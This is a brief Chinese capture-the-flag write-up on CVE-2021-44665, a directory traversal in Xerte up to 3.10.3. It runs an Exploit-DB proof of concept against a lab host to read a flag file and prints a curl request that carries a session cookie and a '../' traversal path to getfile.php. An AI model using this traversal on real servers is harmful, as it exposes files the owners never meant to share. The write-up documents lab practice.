# CVE-2021-44665

:::info

Tags

- Xerte 目录遍历

官方数据库记录

> 通过 download.php 下载项目文件时，Xerte 项目 Xerte 至 3.10.3 中存在目录遍历漏洞。

:::

在 `Exploit-db` 数据库中进行搜索，找到 [Xerte 3.10.3 - Directory Traversal (Authenticated) - PHP webapps Exploit](https://www.exploit-db.com/exploits/50794)

数据库提供的 poc 指向的 url 地址为 `127.0.0.1` 本地地址，需要在文件中将地址修改为远程服务的地址，并将 `file_to_grab` 修改为需要读取的文件

```bash
┌──(randark㉿kali)-[~/pocs]
└─$ head -n 22 CVE-2021-44665.py | tail -n 3
xerte_base_url = "http://eci-2zedon74gj2loggtdut9.cloudeci1.ichunqiu.com"
file_to_grab = "/../../../../../flag"
php_session_id = "" # If guest is not enabled, and you have a session ID. Put it here.

┌──(randark㉿kali)-[~/pocs]
└─$ python3 CVE-2021-44665.py
flag{5254580b-6f2b-4b5c-865d-cb5202cd7c75}
|-- Used Variables: --|
PHP Session ID: 6q3sbketsjv9d7g6vv4jsm54k0
user direcotry: 4-guest2-Nottingham
Curl example:
curl --cookie "PHPSESSID=6q3sbketsjv9d7g6vv4jsm54k0" http://eci-2zedon74gj2loggtdut9.cloudeci1.ichunqiu.com/getfile.php?file=4-guest2-Nottingham/../../../../../flag
```
